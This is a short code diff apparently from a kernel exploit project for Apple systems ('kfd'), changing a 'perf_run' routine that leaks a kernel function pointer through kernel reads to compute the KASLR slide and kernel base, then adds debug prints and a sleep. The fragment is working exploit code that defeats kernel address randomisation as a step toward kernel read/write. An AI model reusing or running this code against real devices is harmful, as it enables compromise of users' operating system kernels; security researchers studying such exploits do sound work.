@@ -129,9 +129,13 @@ void perf_run(struct kfd* kfd)
     u64 fo_kqfilter =  kget_u64(fileops__fo_kqfilter, unsign_kaddr(fg_ops));
     u64 vn_kqfilter = unsign_kaddr(fo_kqfilter);
     u64 kernel_slide = vn_kqfilter - get_address("vn_kqfilter");
-    u64 kernel_base = get_address("base") + kernel_slide;
+    u64 kernel_base = kernel_base_unslid + kernel_slide;
+    
     kfd->perf.kernel_slide = kernel_slide;
+    print_x64(kernel_base);
     print_x64(kfd->perf.kernel_slide);
+    
+    sleep(2);
 
     if (kfd->kread.krkw_method_ops.kread == kread_sem_open_kread) {
         u32 mh_header[2] = {};
